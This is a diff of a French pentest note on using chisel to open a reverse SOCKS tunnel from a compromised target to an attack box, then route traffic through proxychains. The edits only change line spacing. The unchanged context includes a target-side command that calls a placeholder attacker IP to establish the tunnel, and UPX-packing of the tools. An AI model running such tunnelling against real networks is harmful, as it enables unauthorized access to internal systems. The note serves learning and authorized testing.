@@ -15,7 +15,7 @@ go build -gccgoflags="-s -w --static"
 upx brute chisel # réduction de 6 à 1.5Mo
 ```
 
-### Attackbox 
+### Attackbox
 
 On commence par lancer un serveur sur notre machine (on veut que le client chisel se connecte à nous car en général les connexions sortantes sont autorisées mais pas le contraire. C'est un peu l'équivalent du côté "reverse" d'un reverse shell)
 
@@ -26,9 +26,13 @@ chisel server -p 443 --reverse
 ### Cible
 
 On lance chisel en mode client (pour qu'il se connecte à notre serveur).
+
 Une fois lancé, on souhaite qu'il exécute un serveur socks5.
-En principe, un serveur socks s'exécute côté serveur, mais dans notre cas, on souhaite que le serveur socks s'exécute sur notre cible (donc côté client). 
+
+En principe, un serveur socks s'exécute côté serveur, mais dans notre cas, on souhaite que le serveur socks s'exécute sur notre cible (donc côté client).
+
 On utilisera pour ce faire le `R` qui signifit "reverse" pour inverser le sens du tunnel.
+
 On aura donc un serveur socks qui s'exécutera sur notre client et qui sera accessible depuis notre serveur sur un port qui, par défaut, sera le 1080.
 
 ```
@@ -43,6 +47,7 @@ chisel client <ATTACK_BOX_IP>:443 R:socks:1234
 ## Utilisation
 
 On se connectera en utlisant `proxychain`.
+
 On commence par modifier le fichier de configuration `/etc/proxychains4.conf` et ajouter à la fin la section :
 
 ```
